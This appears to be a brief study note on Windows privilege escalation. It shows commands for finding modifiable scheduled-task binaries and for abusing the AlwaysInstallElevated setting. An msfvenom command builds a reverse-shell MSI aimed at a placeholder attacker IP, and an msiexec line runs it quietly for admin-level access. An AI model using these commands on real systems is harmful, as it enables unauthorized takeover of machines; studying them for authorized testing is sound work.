Privilege escalation can sometimes arise from misconfigurations, allowing access to higher privileges, including administrator access.
# Scheduled Tasks

To examine scheduled tasks for lost binaries or modifiable executables. We use the following command:

```shell-session
schtasks /query /tn <task> /fo list /v
```

Now to check the file permissions on the executable, we use `icacls`:

```shell-session
icacls <task_to_run_path>
```
# AlwaysInstallElevated

The **AlwaysInstallElevated** feature allows Windows Installer files (.msi) to run with elevated privileges, even from unprivileged user accounts. This can be exploited to create a malicious MSI that executes with admin rights.

To utilize this method, two registry values must be set. We can check these with the following commands:

```shell-session
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

If both values are set, we can create a malicious MSI using `msfvenom`:

```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

After transferring the file to the target, we run the installer to receive a reverse shell:

```shell-session
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

**Note:** we need to set the appropriate handler for receiving the shell.